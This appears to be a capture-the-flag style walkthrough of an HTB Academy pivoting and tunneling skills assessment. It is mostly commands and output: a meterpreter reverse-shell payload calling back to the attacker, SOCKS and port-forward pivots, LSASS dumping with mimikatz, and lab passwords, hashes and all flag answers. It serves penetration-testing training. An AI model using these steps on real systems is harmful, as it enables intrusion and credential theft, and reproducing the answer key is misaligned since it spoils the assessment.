# HTB Academy Skills Assessment - Pivoting, Tunneling & Port Forwarding

## Complete Walkthrough with Troubleshooting

### Initial Access & Enumeration

#### Question 1: Find credentials for pivoting
**Task:** Find credentials in user directory for network pivoting.

**Solution:**
1. Access web shell on target website
2. Navigate to `/home/` directory:
```bash
cd /home/
ls
# Shows: administrator, webadmin
```

3. Check webadmin directory:
```bash
cd webadmin
ls
# Shows: for-admin-eyes-only, id_rsa
```

4. Verify SSH key:
```bash
file id_rsa
# Output: id_rsa: OpenSSH private key
```

**Answer:** `webadmin`

---

#### Question 2: Extract credentials
**Task:** Submit credentials found in user's home directory (Format: user:password)

**Solution:**
```bash
cat for-admin-eyes-only
```

**Output:**
```
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

**Answer:** `mlefay:Plain Human work!`

---

#### Question 3: Internal network enumeration
**Task:** Discover another active host and submit its IP address.

**Solution:**
1. Extract SSH private key:
```bash
cat id_rsa
# Copy the entire private key content
```

2. Save to local file and set permissions:
```bash
nano id_rsa
chmod 600 id_rsa
```

3. SSH to target:
```bash
ssh -i id_rsa webadmin@TARGET_IP
```

4. Check network interfaces:
```bash
ip a
# Shows: inet 172.16.5.15/16
```

5. Ping sweep internal network:
```bash
for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**Output:**
```
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.771 ms
```

**Answer:** `172.16.5.35`

---

#### Question 4: Pivot to discovered host
**Task:** Use gathered information to pivot to discovered host. Submit contents of C:\Flag.txt

## Method A: SOCKS Proxy (Official Walkthrough)

### Step 1: Generate Meterpreter Payload
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=9001 -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf
```

### Step 2: Transfer Payload
```bash
scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@TARGET_IP:~/
```

### Step 3: Set Up Handler
```bash
msfconsole -q
use exploit/multi/handler
set LHOST 0.0.0.0
set LPORT 9001
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
```

### Step 4: Execute Payload
```bash
# SSH to target
ssh -i id_rsa webadmin@TARGET_IP

# Execute payload
chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
./99c0b43c4bec2bdc280741d8f3e40338.elf
```

### Step 5: Configure SOCKS Proxy
```bash
# Background meterpreter session
bg

# Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run
```

### Step 6: Add Routes
```bash
# Return to meterpreter session
sessions -i 1
run autoroute -s 172.16.5.0/16
```

### Step 7: Configure Proxychains (CRITICAL!)
**⚠️ IMPORTANT: Match SOCKS versions!**

Check MSF SOCKS version:
- If `VERSION 4a` → proxychains needs `socks4`
- If `VERSION 5` → proxychains needs `socks5`

Edit `/etc/proxychains.conf`:
```bash
sudo nano /etc/proxychains.conf

# For VERSION 4a:
socks4  127.0.0.1 9050

# For VERSION 5:
socks5  127.0.0.1 9050
```

### Step 8: Enumerate Target via SOCKS
```bash
proxychains nmap 172.16.5.35 -Pn -sT
```

**Expected Output:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

### Step 9: RDP via Proxychains
```bash
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

---

## Method B: Port Forward (More Reliable)

### Alternative Approach - Direct Port Forwarding

```bash
# After establishing meterpreter session and routes:
sessions -i 1
run autoroute -s 172.16.5.0/16

# Set up port forward
portfwd add -l 13389 -p 3389 -r 172.16.5.35
portfwd list
bg

# Connect directly (no proxychains needed)
xfreerdp /v:127.0.0.1:13389 /u:mlefay /p:'Plain Human work!'
```

---

## Troubleshooting Common Issues

### Issue 1: SOCKS Version Mismatch
**Symptoms:** 
- `proxychains` timeout
- Connection refused errors

**Solution:**
Match SOCKS versions in MSF and proxychains config:
```bash
# Check MSF SOCKS version
show options

# Edit proxychains accordingly
sudo nano /etc/proxychains.conf
```

### Issue 2: Meterpreter Session Dies
**Symptoms:**
- "Meterpreter session closed. Reason: Died"
- Segmentation faults

**Solutions:**
1. Try different payload architectures:
```bash
# 32-bit payload
msfvenom -p linux/x86/meterpreter/reverse_tcp ...

# Shell payload (more stable)
msfvenom -p linux/x64/shell_reverse_tcp ...
```

2. Use port forward instead of SOCKS proxy

### Issue 3: SOCKS Proxy Stops Immediately
**Symptoms:**
- "Starting the SOCKS proxy server"
- "Stopping the SOCKS proxy server" (immediately)

**Solutions:**
1. Check port conflicts:
```bash
netstat -tulpn | grep 9050
```

2. Use different SRVHOST:
```bash
set SRVHOST 127.0.0.1  # Instead of 0.0.0.0
```

3. Kill conflicting jobs:
```bash
jobs
kill 0  # Kill specific job
```

### Issue 4: RDP Certificate Warnings
**Expected behavior:**
```
The above X.509 certificate could not be verified...
Do you trust the above certificate? (Y/T/N) Y
```
**Action:** Type `Y` to accept and continue

---

## Flag Location
Once RDP connection is established:
1. Navigate to `C:\` drive
2. Locate `Flag.txt` file
3. Open and read contents

**Expected Flag Format:** `S1ngl3-Piv07-3@sy-Day`

---

#### Question 5: Find vulnerable user with exposed credentials
**Task:** In previous pentests against Inlanefreight, they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?

### Solution: LSASS Memory Dump Analysis with Mimikatz

#### Step 1: Download Mimikatz on Kali
```bash
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
```

#### Step 2: Transfer Mimikatz to Windows Target
1. Navigate to `x64/` folder in extracted mimikatz
2. Using the existing RDP session to 172.16.5.35:
   - Copy `mimikatz.exe` from Kali
   - Paste into Windows Desktop or Documents folder

#### Step 3: Create LSASS Dump File
1. **Right-click on taskbar** → Select **Task Manager**
2. **Run Task Manager as Administrator:**
   - Click **More details** if in compact view
   - Go to **Processes** tab
   - Find **Local Security Authority Process** (lsass.exe)
   - **Right-click** on it → **Create dump file**
3. **Note the dump location:** `C:\Users\mlefay\AppData\Local\Temp\lsass.DMP`

#### Step 4: Analyze Dump with Mimikatz
1. **Launch mimikatz.exe** (double-click or run as administrator)
2. **Load the minidump:**
```cmd
mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
```

3. **Extract logon passwords:**
```cmd
mimikatz # sekurlsa::LogonPasswords
```

#### Step 5: Identify Vulnerable User
**Expected Output (relevant section):**
```
Authentication Id : 0 ; 160843 (00000000:0002744b)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 11/20/2022 10:09:13 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
        ssp :
        credman :
```

**Analysis:**
- User `vfrank` has plaintext password stored in Kerberos section
- Password: `Imply wet Unmasked!`
- This indicates poor service account management practices

**Answer:** `vfrank`

#### Alternative Method: Using Task Manager Memory Dump
If mimikatz fails to run:
1. Create dump as described above
2. Transfer dump file back to Kali
3. Use pypykatz or other LSASS analysis tools:
```bash
pypykatz lsa minidump lsass.DMP
```

#### Security Implications
- **Service Account Misuse:** User account likely used for service authentication
- **Credential Exposure:** Plaintext passwords stored in LSASS memory
- **Attack Path:** Credentials can be used for lateral movement
- **Remediation:** Use managed service accounts (MSA/gMSA) instead of user accounts

---

#### Question 6: Pivot to another network using discovered credentials
**Task:** For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.

### Solution: Network Enumeration & RDP Pivot

#### Step 1: Network Enumeration from Windows Host
Using the existing RDP session to 172.16.5.35, enumerate the next network segment:

**PowerShell Ping Sweep:**
```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

**Expected Output:**
```
172.16.6.1: False
172.16.6.2: False
...
172.16.6.23: False
172.16.6.24: False
172.16.6.25: True
172.16.6.26: False
...
```

**Result:** Host `172.16.6.25` is alive

#### Step 2: RDP to Discovered Host
Using credentials discovered in Question 5:
- **Username:** `vfrank`
- **Password:** `Imply wet Unmasked!`

**Method 1: From Windows RDP session (172.16.5.35):**
1. Open **Run** dialog (Windows + R)
2. Type: `mstsc`
3. Enter connection details:
   - **Computer:** `172.16.6.25`
   - **Username:** `vfrank`
   - **Password:** `Imply wet Unmasked!`

**Method 2: Via Kali through existing pivot:**
```bash
# Add route for new network
sessions -i 2
run autoroute -s 172.16.6.0/24

# Port forward for RDP
portfwd add -l 23389 -p 3389 -r 172.16.6.25
bg

# Connect from Kali
xfreerdp /v:127.0.0.1:23389 /u:vfrank /p:'Imply wet Unmasked!'
```

#### Step 3: Retrieve Flag
Once connected to 172.16.6.25:
1. Open **Command Prompt** (cmd)
2. Read flag file:
```cmd
type C:\Flag.txt
```

**Expected Output:**
```
N3tw0rk-H0pp1ng-f0R-FuN
```

**Answer:** `N3tw0rk-H0pp1ng-f0R-FuN`

---

#### Question 7: Access Domain Controller flag
**Task:** Submit the contents of C:\Flag.txt located on the Domain Controller.

### Solution: Network Share Access

#### Step 1: Access Network Share
Using the same RDP connection to 172.16.6.25 (vfrank user):

1. **Open File Explorer** (Windows + E)
2. **Navigate to "This PC"**
3. **Look for mapped network drives**
4. **Double-click on "AutomateDCAdmin (Z:)" drive**

#### Step 2: Retrieve Domain Controller Flag
1. **Browse the Z: drive** (AutomateDCAdmin share)
2. **Locate Flag.txt** file
3. **Open or read the flag file**

**Alternative via Command Line:**
```cmd
# Change to network drive
Z:

# List contents
dir

# Read flag
type Flag.txt
```

**Expected Output:**
```
3nd-0xf-Th3-R@inbow!
```

**Answer:** `3nd-0xf-Th3-R@inbow!`

#### Security Analysis - Question 7
- **Network Share Misconfiguration:** Domain Controller accessible via network share
- **Privilege Escalation:** User account has access to DC resources
- **Poor Access Controls:** Sensitive data accessible through mapped drives
- **Attack Path:** Compromised user account → Network share → Domain Controller access

---

## Complete Skills Assessment Summary

| Question | Task | Answer | Method |
|----------|------|--------|---------|
| 1 | Find credentials directory | `webadmin` | Web shell enumeration |
| 2 | Extract credentials | `mlefay:Plain Human work!` | File contents analysis |
| 3 | Internal network discovery | `172.16.5.35` | Ping sweep |
| 4 | Pivot to discovered host | `S1ngl3-Piv07-3@sy-Day` | Meterpreter + RDP |
| 5 | Find vulnerable user | `vfrank` | LSASS analysis with Mimikatz |
| 6 | Pivot to next network | `N3tw0rk-H0pp1ng-f0R-FuN` | PowerShell enum + RDP |
| 7 | Access Domain Controller | `3nd-0xf-Th3-R@inbow!` | Network share access |

## Attack Path Overview

```
1. Web Shell (Initial Access)
   ↓
2. SSH Key Discovery (webadmin credentials)
   ↓
3. SSH Access → Network Enumeration (172.16.5.35)
   ↓
4. Meterpreter Payload → Pivoting Setup
   ↓
5. RDP Access (mlefay:Plain Human work!)
   ↓
6. LSASS Dump → Mimikatz Analysis (vfrank credentials)
   ↓
7. Network Enumeration → RDP Pivot (172.16.6.25)
   ↓
8. Network Share Access → Domain Controller
```

## Security Recommendations

1. **Web Application Security:** Remove web shells, implement proper access controls
2. **SSH Key Management:** Secure private keys, implement key rotation
3. **Network Segmentation:** Implement proper VLAN separation
4. **Service Account Hygiene:** Use managed service accounts (MSA/gMSA)
5. **LSASS Protection:** Enable Credential Guard, LSA Protection
6. **RDP Security:** Implement NLA, disable RDP where not needed
7. **Network Shares:** Review and restrict domain controller access
8. **Monitoring:** Implement logging for pivoting activities and lateral movement

---

## Key Takeaways

1. **SOCKS Version Compatibility:** Always match MSF SOCKS version with proxychains config
2. **Port Forward vs SOCKS:** Port forwarding is often more reliable than SOCKS proxy
3. **Session Stability:** Linux meterpreter payloads can be unstable; consider alternatives
4. **Network Routes:** Ensure autoroute is properly configured before attempting pivots
5. **Troubleshooting Order:** 
   - Check session status
   - Verify routes
   - Confirm proxy/port forward status
   - Test simple connections first

## Alternative Methods Summary

| Method | Pros | Cons | Reliability |
|--------|------|------|-------------|
| SOCKS Proxy | Protocol agnostic, multiple connections | Version conflicts, complex setup | Medium |
| Port Forward | Simple, direct, stable | One port at a time | High |
| SSH Tunneling | Built-in, no MSF needed | Requires SSH access | High |

**Recommendation:** Start with port forward for single services, use SOCKS for multiple protocols.

---

## Complete Command Reference

### Payload Generation & Transfer
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=9001 -f elf -o payload.elf
scp -i id_rsa payload.elf webadmin@TARGET:~/
```

### MSF Handler Setup
```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 9001
run
```

### Routing & Pivoting
```bash
# Autoroute
run autoroute -s 172.16.5.0/16
run autoroute -p

# SOCKS Proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run

# Port Forward
portfwd add -l 13389 -p 3389 -r 172.16.5.35
portfwd list
```

### Target Connection
```bash
# Via SOCKS
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'

# Via Port Forward
xfreerdp /v:127.0.0.1:13389 /u:mlefay /p:'Plain Human work!'
``` 